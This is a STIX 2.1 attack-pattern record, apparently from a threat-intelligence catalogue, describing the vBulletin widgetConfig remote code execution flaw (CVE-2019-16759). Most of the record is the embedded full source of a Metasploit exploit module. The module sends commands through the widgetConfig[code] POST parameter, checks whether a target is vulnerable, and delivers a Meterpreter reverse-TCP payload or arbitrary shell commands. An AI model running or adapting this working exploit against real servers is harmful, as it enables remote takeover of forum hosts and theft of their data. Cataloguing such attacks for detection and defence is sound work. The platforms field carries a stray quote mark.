{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--7d3b221b-5e79-4531-8df4-e2be0103c0a6",
    "created": "2024-08-14T17:08:32.399266Z",
    "modified": "2024-08-14T17:08:32.399271Z",
    "name": "vBulletin widgetConfig RCE",
    "description": " vBulletin 5.x through 5.5.4 allows remote command execution via the widgetConfig[code] parameter in an ajax/render/widget_php routestring POST request. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/multi/http/vbulletin_widgetconfig_rce.rb",
            "external_id": "vbulletin_widgetconfig_rce.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-16759"
        },
        {
            "source_name": "reference",
            "url": "https://seclists.org/fulldisclosure/2019/Sep/31"
        },
        {
            "source_name": "reference",
            "url": "https://blog.sucuri.net/2019/09/zero-day-rce-in-vbulletin-v5-0-0-v5-5-4.html"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpClient\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name' => 'vBulletin widgetConfig RCE',\n      'Description' => %q{\n        vBulletin 5.x through 5.5.4 allows remote command execution via the widgetConfig[code]\n        parameter in an ajax/render/widget_php routestring POST request.\n      },\n      'Author' => [\n        'unknown', # discovered by an unknown sender.\n        'mekhalleh (RAMELLA S\u00e9bastien)' # this module.\n      ],\n      'References' => [\n        ['CVE', '2019-16759'],\n        ['URL', 'https://seclists.org/fulldisclosure/2019/Sep/31'],\n        ['URL', 'https://blog.sucuri.net/2019/09/zero-day-rce-in-vbulletin-v5-0-0-v5-5-4.html']\n      ],\n      'DisclosureDate' => '2019-09-23',\n      'License' => MSF_LICENSE,\n      'Platform' => ['php', 'unix', 'windows'],\n      'Arch' => [ARCH_CMD, ARCH_PHP],\n      'Privileged' => true,\n      'Targets' => [\n        ['Meterpreter (PHP In-Memory)',\n          'Platform' => 'php',\n          'Arch' => [ARCH_PHP],\n          'Type' => :php_memory,\n          'Payload' => {\n            'BadChars' => \"\\x22\",\n          },\n          'DefaultOptions' => {\n            'PAYLOAD' => 'php/meterpreter/reverse_tcp',\n            'DisablePayloadHandler' => false\n          }\n        ],\n        ['Unix (CMD In-Memory)',\n          'Platform' => 'unix',\n          'Arch' => ARCH_CMD,\n          'Type' => :unix_cmd,\n          'DefaultOptions' => {\n            'PAYLOAD' => 'cmd/unix/generic',\n            'DisablePayloadHandler' => true\n          }\n        ],\n        ['Windows (CMD In-Memory)',\n          'Platform' => 'windows',\n          'Arch' => ARCH_CMD,\n          'Type' => :windows_cmd,\n          'DefaultOptions' => {\n            'PAYLOAD' => 'cmd/windows/generic',\n            'DisablePayloadHandler' => true\n          }\n        ]\n      ],\n      'DefaultTarget' => 0,\n      'Notes' => {\n        'Stability' => [CRASH_SAFE],\n        'Reliability' => [REPEATABLE_SESSION],\n        'SideEffects' => [IOC_IN_LOGS]\n      }\n    ))\n\n    register_options([\n      OptString.new('TARGETURI', [true, 'The URI of the vBulletin base path', '/']),\n      OptEnum.new('PHP_CMD', [true, 'Specify the PHP function in which you want to execute the payload.', 'shell_exec', ['shell_exec', 'exec']])\n    ])\n  end\n\n  def cmd_payload(command)\n    return(\"echo #{datastore['PHP_CMD']}('#{command}'); exit;\")\n  end\n\n  def execute_command(command)\n    response = send_request_cgi({\n      'method' => 'POST',\n      'uri' => normalize_uri(target_uri.path),\n      'encode_params' => true,\n      'vars_post' => {\n        'routestring' => 'ajax/render/widget_php',\n        'widgetConfig[code]' => command\n      }\n    })\n    if (response) && (response.body)\n      return response\n    end\n\n    return false\n  end\n\n  def check\n    rand_str = Rex::Text.rand_text_alpha(8)\n    received = execute_command(cmd_payload(\"echo #{rand_str}\"))\n    if received && received.body.include?(rand_str)\n      return Exploit::CheckCode::Vulnerable\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n  def exploit\n    vprint_good(\"The target appears to be vulnerable.\")\n\n    print_status(\"Sending #{datastore['PAYLOAD']} command payload\")\n    case target['Type']\n    when :unix_cmd, :windows_cmd\n      cmd = cmd_payload(payload.encoded)\n      vprint_status(\"Generated command payload: #{cmd}\")\n\n      received = execute_command(cmd)\n      if (received) && (datastore['PAYLOAD'] == \"cmd/#{target['Platform']}/generic\")\n        print_warning('Dumping command output in body response')\n        if received.body.empty?\n          print_error('Empty response, no command output')\n          return\n        end\n        print_line(\"#{received.body}\")\n      end\n\n    when :php_memory\n      vprint_status(\"Generated command payload: #{payload.encoded}\")\n      execute_command(payload.encoded)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-09-23",
    "x_mitre_platforms": [
        "windows'"
    ]
}